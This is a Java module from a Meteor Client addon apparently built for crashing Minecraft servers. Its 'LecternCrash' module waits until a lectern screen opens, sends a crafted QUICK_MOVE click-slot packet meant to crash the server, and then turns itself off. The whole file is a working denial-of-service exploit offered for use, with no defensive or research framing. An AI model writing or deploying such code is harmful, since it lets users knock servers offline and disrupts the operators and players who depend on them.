package widecat.meteorcrashaddon.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import widecat.meteorcrashaddon.CrashAddon;

public class LecternCrash extends Module {

    public LecternCrash() {
        super(CrashAddon.CATEGORY, "讲台崩溃", "当你打开讲台时发送一个有趣的包");
    }

    @EventHandler
    private void onOpenScreenEvent(OpenScreenEvent event) {
        if (!(event.screen instanceof LecternScreen)) return;
        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
        toggle();
    }
}
